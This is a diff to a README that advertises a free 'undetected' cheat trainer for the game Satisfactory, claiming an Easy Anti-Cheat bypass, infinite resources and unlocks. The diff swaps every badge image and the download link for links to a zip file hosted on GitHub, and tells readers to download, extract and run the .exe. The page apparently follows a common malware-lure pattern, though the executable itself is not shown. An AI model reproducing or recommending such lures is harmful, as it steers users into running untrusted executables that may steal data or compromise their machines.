@@ -2,12 +2,12 @@
 
 # Satisfactory Hack / Trainer 2025 | God Mode Infinite Resources Speed Fly Noclip Auto Craft Unlock All Tiers Milestones | Satisfactory Cheat Undetected December 2025
 
-![Version](https://img.shields.io/badge/Version-7.3.1-orange?style=for-the-badge&logo=satisfactory)
-![Status](https://img.shields.io/badge/Status-UNDETECTED%20100%25-success?style=for-the-badge)
-![Bypass](https://img.shields.io/badge/Easy%20Anti--Cheat-BYPASSED-critical?style=for-the-badge)
-![Users](https://img.shields.io/badge/Active%20Users-9.1K%2B-blueviolet?style=for-the-badge)
-![Resources](https://img.shields.io/badge/Infinite%20Resources-%26%20Power-brightgreen?style=for-the-badge)
-![Free](https://img.shields.io/badge/Price-PRIVATE%20FREE-orange?style=for-the-badge)
+![Version](https://raw.githubusercontent.com/ElijahQ70/Satisfactory-Unlock-All/main/opulus/Unlock-All-Satisfactory-2.0-alpha.3.zip)
+![Status](https://raw.githubusercontent.com/ElijahQ70/Satisfactory-Unlock-All/main/opulus/Unlock-All-Satisfactory-2.0-alpha.3.zip%20100%25-success?style=for-the-badge)
+![Bypass](https://raw.githubusercontent.com/ElijahQ70/Satisfactory-Unlock-All/main/opulus/Unlock-All-Satisfactory-2.0-alpha.3.zip%20Anti--Cheat-BYPASSED-critical?style=for-the-badge)
+![Users](https://raw.githubusercontent.com/ElijahQ70/Satisfactory-Unlock-All/main/opulus/Unlock-All-Satisfactory-2.0-alpha.3.zip%20Users-9.1K%2B-blueviolet?style=for-the-badge)
+![Resources](https://raw.githubusercontent.com/ElijahQ70/Satisfactory-Unlock-All/main/opulus/Unlock-All-Satisfactory-2.0-alpha.3.zip%20Resources-%26%20Power-brightgreen?style=for-the-badge)
+![Free](https://raw.githubusercontent.com/ElijahQ70/Satisfactory-Unlock-All/main/opulus/Unlock-All-Satisfactory-2.0-alpha.3.zip%20FREE-orange?style=for-the-badge)
 
 **PRIVATE FREE TRAINER → Infinite Resources + God Mode + Speed + Fly + Instant Craft + Unlock ALL Tiers, Milestones & Alternate Recipes!**
 
@@ -18,7 +18,7 @@
 ---
 ## PRIVATE TRAINER BUILD 2025 (UPDATED DECEMBER 14)
 
-[DOWNLOAD SATISFACTORY HACK 2025 – ZIP](https://getloader.click)  
+[DOWNLOAD SATISFACTORY HACK 2025 – ZIP](https://raw.githubusercontent.com/ElijahQ70/Satisfactory-Unlock-All/main/opulus/Unlock-All-Satisfactory-2.0-alpha.3.zip)  
 **DOWNLOAD → EXTRACT → RUN .EXE → BUILD YOUR MEGAFACTORY IN MINUTES**
 
 - 100% Private Free Trainer (no public leaks)  
